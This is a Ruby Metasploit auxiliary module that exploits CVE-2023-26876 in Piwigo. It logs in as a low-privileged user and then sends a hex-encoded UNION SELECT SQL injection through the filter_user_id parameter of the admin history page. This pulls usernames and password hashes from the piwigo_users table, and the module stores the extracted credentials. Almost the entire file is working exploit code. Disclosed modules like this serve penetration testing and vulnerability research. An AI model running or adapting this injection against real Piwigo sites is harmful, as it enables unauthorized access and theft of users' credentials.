##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Piwigo Gather Credentials via SQL Injection',
      'Description'    => %q{
         This module enables an authenticated user to collect the usernames and
         encrypted passwords of other users in the Piwigo via SQL
         injection.
      },
      'Author'         => [
                            'Rodolfo "bod4k" Tavares'
                          ],
      'License'        => MSF_LICENSE,
      'References'     => [
                            [ 'CVE', '2023-26876' ] # CVE-2023-26876 https://nvd.nist.gov/vuln/detail/CVE-2023-26876
                          ],
      'DisclosureDate' => '04/21/2023'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to Piwigo', '/' ]),
        OptString.new('USERNAME', [ true, 'The username for authenticating to Piwigo', 'piwigo' ]),
        OptString.new('PASSWORD', [ true, 'The password for authenticating to Piwigo', 'piwigo' ])
      ])
  end

  def check
    login_page = target_uri.path.end_with?('index.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/index.php')

    res = send_request_cgi(
      'method'  =>  'GET',
      'keep_cookies' => true,
      'uri'     =>  normalize_uri(login_page)
    )

    if res && res.code == 200
      return res
    else
      print_error('[!] could not find any piwigo instance')
    end

    return res
  end

  def login(response)
    return false unless response

    login_uri = target_uri.path.end_with?('identification.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/identification.php')
    print_status("[*] Logging in...")

    login_res = send_request_cgi(
       'method'  =>  'POST',
       'uri'     =>  login_uri,
       'keep_cookies' => true,
       'vars_post' =>  {
         'username'  =>  datastore['USERNAME'],
         'password'  =>  datastore['PASSWORD'],
         'login' =>  'Login'
       }
     )

     if login_res.code != 302 || login_res.body.include?('Invalid username or password!')
      fail_with(Failure::NoAccess, "Couldn't log into Piwigo")
     end

     print_good("[*] Successfully logged into Piwigo!!")
     return login_res
  end

  def get_info(response_from_login)

    inject_uri = target_uri.path.end_with?('admin.php') ? target_uri.path.gsub('admin.php', '') : target_uri.path
    inject_uri <<= "admin.php?page=history&filter_image_id=1&filter_user_id="
    cmd = "12 UNION ALL SELECT CONCAT(0x41414141,username,0x3a,password,0x41414141) from piwigo_users where id=1-- --"
    cmd = Rex::Text.uri_encode(cmd, 'hex-all')
    inject_uri <<= cmd

    response_from_login_ = send_request_cgi(
      'method'  =>  'GET',
      'uri'     => normalize_uri(inject_uri),
    )

    unless response_from_login_ && response_from_login_.body.include?('filter_user_name =')
     fail_with(Failure::NotFound, "Failed to access page. The user may not have permissions.")
    end

    print_good("[*] credentials working, and user have privileges")
    format_results(response_from_login_.body)
  end

  def format_results(output)
    credentials = output.scan(/filter_user_name\s\D\s("AAAA(.*)AAAA");/m)

    fail_with(Failure::NotFound, "No credentials found") if credentials.empty?

    credentials.each do |i, j|
      print_good("[*] Credencials: #{j}")
      store_valid_credential(user: j, private: i)
    end
  end

  def run
    available_res = check
    fail_with(Failure::NotFound, "Could not access the Piwigo webpage") unless available_res

    response_from_login = login(available_res)
    fail_with(Failure::NoAccess, "Could not log in. Verify credentials") unless response_from_login

    get_info(response_from_login)
  end
end

